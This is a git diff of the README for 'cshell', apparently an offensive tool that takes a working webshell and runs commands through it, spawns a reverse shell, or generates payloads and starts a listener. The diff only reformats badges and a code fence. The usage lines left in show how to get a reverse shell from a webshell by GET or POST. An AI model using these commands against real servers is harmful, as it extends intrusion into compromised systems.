@@ -1,7 +1,6 @@
 # CSHELL  
 ***  
-[![PyPI version fury.io](https://badge.fury.io/py/ansicolortags.svg)](https://pypi.python.org/pypi/cshell/)   ||  
-    [![GitHub license](https://img.shields.io/github/license/Naereen/StrapDown.js.svg)](https://github.com/0z09e/cshell/LICENSE)  
+[![PyPI version fury.io](https://badge.fury.io/py/ansicolortags.svg)](https://pypi.python.org/pypi/cshell/)  [![GitHub license](https://img.shields.io/github/license/Naereen/StrapDown.js.svg)](https://github.com/0z09e/cshell/LICENSE)  
   
 ***  
 This script takes a working webshell as an argument and can perform the following operations  
@@ -37,7 +36,8 @@ optional arguments:
 web     Direct command execution on the webshell with error message  
 rev     Reverse shell from a working webshell  
 lstnr   Generate payload, copy it to your clipboard and start a listener[Optional]  
-```  
+```
+
 - **Getting a reverse shell from a webshell :**   
 	- GET Method  : `cshell rev -i <Interface or IP> <Target URL with REV as command>`  
 	- POST Method : `cshell rev -i <Interface or IP> -m POST -d <Post DATA in JSON format with REV as command> <Target URL>`  
